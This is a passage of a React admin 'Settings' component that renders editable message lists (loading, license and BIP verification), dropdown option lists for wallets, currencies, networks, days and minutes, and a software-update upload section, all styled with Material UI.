                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These messages are displayed during the initial loading process. One message per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="initialLoadingMessages"
                    value={Array.isArray(settings.initialLoadingMessages) ? settings.initialLoadingMessages.join('\n') : ''}
                    onChange={(e) => {
                      const messages = e.target.value.split('\n').filter(msg => msg.trim() !== '');
                      setSettings({
                        ...settings,
                        initialLoadingMessages: messages
                      });
                    }}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
              
              {messageTabIndex === 1 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    License Verification Messages
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These messages are displayed during the license verification process. One message per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="licenseVerificationMessages"
                    value={Array.isArray(settings.licenseVerificationMessages) ? settings.licenseVerificationMessages.join('\n') : ''}
                    onChange={(e) => {
                      const messages = e.target.value.split('\n').filter(msg => msg.trim() !== '');
                      setSettings({
                        ...settings,
                        licenseVerificationMessages: messages
                      });
                    }}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
              
              {messageTabIndex === 2 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    BIP Verification Messages
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These messages are displayed during the BIP verification process. One message per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="bipVerificationMessages"
                    value={Array.isArray(settings.bipVerificationMessages) ? settings.bipVerificationMessages.join('\n') : ''}
                    onChange={(e) => {
                      const messages = e.target.value.split('\n').filter(msg => msg.trim() !== '');
                      setSettings({
                        ...settings,
                        bipVerificationMessages: messages
                      });
                    }}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
            </AccordionDetails>
          </Accordion>
        </Grid>
        
        {/* Dropdown Options */}
        <Grid item xs={12}>
          <Accordion 
            sx={{ 
              backgroundColor: '#222222',
              '&:before': {
                display: 'none',
              },
            }}
          >
            <AccordionSummary
              expandIcon={<ExpandMoreIcon sx={{ color: '#00e6b8' }} />}
              sx={{ 
                backgroundColor: 'rgba(0, 230, 184, 0.1)',
                borderBottom: '1px solid #353b48',
              }}
            >
              <Typography variant="h6" sx={{ color: '#00e6b8' }}>
                <ListIcon sx={{ mr: 1, verticalAlign: 'middle' }} />
                Dropdown Options
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Tabs 
                value={dropdownTabIndex} 
                onChange={handleDropdownTabChange}
                sx={{ 
                  mb: 2,
                  '& .MuiTabs-indicator': {
                    backgroundColor: '#00e6b8',
                  },
                  '& .MuiTab-root': {
                    color: '#7f8fa6',
                    '&.Mui-selected': {
                      color: '#00e6b8',
                    },
                  },
                }}
              >
                <Tab label="Wallets" />
                <Tab label="Currencies" />
                <Tab label="Networks" />
                <Tab label="Days" />
                <Tab label="Minutes" />
              </Tabs>
              
              {dropdownTabIndex === 0 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    Wallet Options
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These options are displayed in the wallet dropdown. One option per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="walletOptions"
                    value={settings.walletOptions}
                    onChange={handleInputChange}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
              
              {dropdownTabIndex === 1 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    Currency Options
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These options are displayed in the currency dropdown. One option per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="currencyOptions"
                    value={settings.currencyOptions}
                    onChange={handleInputChange}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
              
              {dropdownTabIndex === 2 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    Network Options
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These options are displayed in the network dropdown. One option per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="networkOptions"
                    value={settings.networkOptions}
                    onChange={handleInputChange}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
              
              {dropdownTabIndex === 3 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    Day Options
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These options are displayed in the day dropdown. One option per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="dayOptions"
                    value={settings.dayOptions}
                    onChange={handleInputChange}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
              
              {dropdownTabIndex === 4 && (
                <Box sx={{ p: 2, border: '1px solid #353b48', borderRadius: '4px' }}>
                  <Typography variant="subtitle2" gutterBottom sx={{ color: '#f5f6fa' }}>
                    Minute Options
                  </Typography>
                  <Typography variant="body2" sx={{ color: '#7f8fa6', mb: 2 }}>
                    These options are displayed in the minute dropdown. One option per line.
                  </Typography>
                  <TextareaAutosize
                    minRows={10}
                    name="minuteOptions"
                    value={settings.minuteOptions}
                    onChange={handleInputChange}
                    style={{
                      width: '100%',
                      backgroundColor: '#1a1a1a',
                      color: '#f5f6fa',
                      borderColor: '#353b48',
                      padding: '10px',
                      fontFamily: 'monospace',
                      fontSize: '14px',
                      borderRadius: '4px'
                    }}
                  />
                </Box>
              )}
            </AccordionDetails>
          </Accordion>
        </Grid>
      </Grid>
      
      {/* Software Update Section */}
      <Paper sx={{ mt: 3, p: 3, backgroundColor: '#222222' }}>
        <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <Box>
            <Typography variant="h6" gutterBottom sx={{ color: '#00e6b8' }}>
              Software Updates
            </Typography>
            <Typography variant="body2" sx={{ color: '#7f8fa6' }}>
              Upload a new version of the software for users to download.
            </Typography>
          </Box>
          <Button
            variant="contained"
            component="label"
            startIcon={<CloudUploadIcon />}
            sx={{
              backgroundColor: '#00e6b8',
              '&:hover': {
                backgroundColor: '#00c9a0',
              },
            }}
          >
            Upload New Version
            <input
              type="file"
              hidden
            />
          </Button>
        </Box>
        <Divider sx={{ my: 2, backgroundColor: '#353b48' }} />
        <Typography variant="body2" sx={{ color: '#7f8fa6' }}>
          Current version: {settings.appVersion} ({settings.updateChannel})
        </Typography>
      </Paper>

      {/* Snackbar for notifications */}
      <Snackbar
        open={snackbar.open}
        autoHideDuration={4000}
        onClose={handleCloseSnackbar}
        anchorOrigin={{ vertical: 'bottom', horizontal: 'right' }}
      >
        <Alert 
          onClose={handleCloseSnackbar} 
          severity={snackbar.severity} 
          sx={{ width: '100%' }}
        >
          {snackbar.message}
        </Alert>
      </Snackbar>
    </Box>
  );
}

export default Settings;
